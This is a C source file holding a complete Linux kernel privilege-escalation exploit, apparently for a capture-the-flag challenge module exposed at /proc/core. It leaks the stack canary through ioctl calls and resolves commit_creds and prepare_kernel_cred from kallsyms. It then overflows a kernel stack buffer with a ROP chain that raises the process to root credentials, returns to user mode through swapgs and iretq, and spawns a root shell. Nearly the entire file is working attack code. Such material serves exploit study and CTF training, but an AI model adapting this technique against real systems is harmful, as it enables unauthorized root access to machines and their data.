// gcc -masm=intel exp.c -static -no-pie -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

/* 
 * core_read(int64_t a1)
 * copy_to_user(a1, &stack[off], 64);
 * */

void core_read(int fd, int64_t addr)
{
	printf("[*] core read: 0x%llx\n", addr);
	ioctl(fd, 0x6677889b, addr);
	return ;
}

/*
 * off = a3 
 * */
void set_off(int fd, int64_t offset)
{
	printf("[*] set off: 0x%llx\n", offset);
	ioctl(fd, 0x6677889c, offset);
	return ;
}

/*
 * core_copy_func(int64_t a1)
 * qmemcpy(stack, &name, (unsigned int16_t) a1); // buf overflow
 * 
 * name = ELF+0x840;
 * */
void core_copy_func(int fd, int64_t size)
{
	printf("[*] core copy from name to stack: 0x%llx\n", size);
	ioctl(fd, 0x6677889a, size);
	return ;
}

int64_t user_cs, user_ss, user_rfalgs, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;\n"
			"mov user_ss, ss;\n"
			"mov user_sp, rsp;\n"
			"pushf;\n"
			"pop user_rfalgs;\n");
	puts("[*] save status successful");
}


int64_t commit_creds = 0, prepare_kernel_cred = 0;
int64_t vmlinux_base = 0;

void find_symbols()
{
	FILE* fd = fopen("/tmp/kallsyms", "r");

	if(fd < 0)
	{
		puts("[*] open /tmp/kallsyms error");
		exit(0);
	}

	char buf[0x30] = {0};
	
	while(fgets(buf, 0x30, fd))
	{
		if(commit_creds && prepare_kernel_cred)
			return ;

		if(!commit_creds && strstr(buf, "commit_creds"))
		{
			puts(buf);
			char hex[0x20] = {0};
			strncpy(hex, buf, 0x20);
			sscanf(hex, "%llx", &commit_creds);
			/* printf("[*] commit_creds: 0x%llx\n", commit_creds); */
			
			vmlinux_base = commit_creds - 0x9c8e0;
			/* printf("[*] vmlinux base: 0x%llx\n", vmlinux_base); */
		}

		if(!prepare_kernel_cred && strstr(buf, "prepare_kernel_cred"))
		{
			puts(buf);
			char hex[0x20] = {0};
			strncpy(hex, buf, 0x20);
			sscanf(hex, "%llx", &prepare_kernel_cred);
			printf("[*] prepare_kernel_cred: 0x%llx\n", prepare_kernel_cred);
		}
	}

	if(!commit_creds || !prepare_kernel_cred)
	{
		puts("[*] error");
		exit(0);
	}
}

void get_shell()
{
	system("/bin/sh\x00");
	return ;
}

int main()
{
	save_status();

	int fd = 0;
	fd = open("/proc/core", 2);

	if(fd < 0)
	{
		puts("[*] open /proc/core error");
		exit(0);
	}
	
	find_symbols();
	
	// pop rdi; ret 
	unsigned long pop_rdi_ret = vmlinux_base + 0xb2f;
	// mov rdi, rax; call rdx
	unsigned long mov_rdi = vmlinux_base + 0x1aa6a;
	// pop rdx; ret
	unsigned long pop_rdx = vmlinux_base + 0xa0f49;
	// pop rcx; ret
	unsigned long pop_rcx = vmlinux_base + 0x21e53;
	// swapgs; popfq; ret
	unsigned long swapgs_popfq_ret = vmlinux_base + 0xa012da;
	// iretq; ret;
	unsigned long iretq_ret = vmlinux_base + 0x50ac2;

	set_off(fd, 0x40);

	char buf[0x40] = {0};

	core_read(fd, buf);
	int64_t canary = ((int64_t *)buf)[0];
	printf("[*] canary: 0x%llx\n", canary);
	printf("[*] break pop_rdx_ret: 0x%llx\n", pop_rdx );

	// add rsp, 0x48
	// pop rbx
	// ret 
	unsigned long rop_chain[] = {
		canary,
		canary,
		canary,
		canary,
		canary,
		canary,
		canary,
		canary,
		canary,
		canary,
		pop_rdi_ret,
		0,
		prepare_kernel_cred,
		pop_rdx,
		pop_rdx,
		/* pop_rcx, */
		mov_rdi,
		commit_creds,
		swapgs_popfq_ret,
		0,
		iretq_ret,
		get_shell,
		user_cs,
		user_rfalgs,
		user_sp,
		user_ss,
	};

	write(fd, rop_chain, 0x800);
	core_copy_func(fd, 0xffffffffffff0000 | 0x100);

	return 0;
}
